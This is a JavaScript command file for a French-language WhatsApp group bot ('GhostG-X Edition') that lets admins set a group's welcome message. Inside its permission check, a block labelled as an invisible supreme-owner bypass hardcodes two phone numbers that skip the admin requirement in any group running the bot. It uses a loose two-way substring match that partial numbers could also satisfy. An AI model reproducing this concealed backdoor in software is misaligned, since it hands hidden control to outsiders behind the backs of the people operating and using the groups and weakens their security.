/**
 * Set Welcome - Customize welcome message
 * GhostG-X Edition
 * Sécurité : Supreme Owner Master Access (Invisible Bypass)
 */

const db = require('../../database');
const config = require('../../config.js'); 

// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

const prefix = config.prefix || '.';

module.exports = {
  name: 'inscription',
  aliases: ['welcometext', 'setwelcome'],
  category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴘᴇʀsᴏɴɴᴀʟɪsᴇ ʟᴇ ᴍᴇssᴀɢᴇ ᴅ\'ᴀᴄᴄᴜᴇɪʟ ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  usage: `${prefix}inscription <message>`, // 💡 Dynamique avec ton préfixe actuel
  groupOnly: true,
  adminOnly: true, // 🔐 Sécurisé pour éviter les dérives de membres
  botAdminNeeded: false,

  async execute(sock, msg, args, extra) {
    const { reply } = extra;
    const from = extra.from;

    try {
      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');

      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise active)
      const supremeOwners = ['22651622652', '22665108174'];
      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));

      // SÉCURITÉ : Vérification via le config.js
      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
      if (!extra.isAdmin && !isMe) {
        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      if (!args.length) {
        const groupSettings = db.getGroupSettings(from);

        return reply(
          `*╭╼━━━≪• ᴍᴇssᴀɢᴇ ᴅ'ᴀᴄᴄᴜᴇɪʟ •≫━━━╾╮*\n` +
          `*┃* 📝 *${toSmallCaps('message actuel')} :*\n` +
          `*┃* ${groupSettings.welcomeMessage || 'ᴀᴜᴄᴜɴ'}\n\n` +
          `*┃* 🔮 *${toSmallCaps('incantations disponibles')} :*\n` +
          `*┃* ${prefix}inscription <message>\n\n` +
          `*┃* 💡 *${toSmallCaps('astuce')} :* ${toSmallCaps('utilisez')} \`@user\` ${toSmallCaps('pour mentionner l individu qui rejoint le sanctuaire')}.\n\n` +
          `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
        );
      }

      const welcomeMessage = args.join(' ');

      if (welcomeMessage.length > 500) {
        return reply(`*❌ ${toSmallCaps('le message d accueil est trop long')} ! (ᴍᴀxɪᴍᴜᴍ 𝟻𝟶𝟶 ᴄᴀʀᴀᴄᴛᴇʀᴇs).* \n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      db.updateGroupSettings(from, { welcomeMessage });

      await sock.sendMessage(from, {
        text: `*✅ ${toSmallCaps('message d accueil mis a jour')} !*\n\n` +
              `🔮 *ᴀᴘᴇʀᴄ̧ᴜ :*\n` +
              `${welcomeMessage.replace('@user', '@' + senderNumber)}\n\n` +
              `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`,
        mentions: [senderJid]
      }, { quoted: msg });

    } catch (error) {
      console.error('Set Welcome Error:', error);
      await reply(`*❌ ${toSmallCaps('l invocation a echoue')} : ${error.message}*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
    }
  }
};
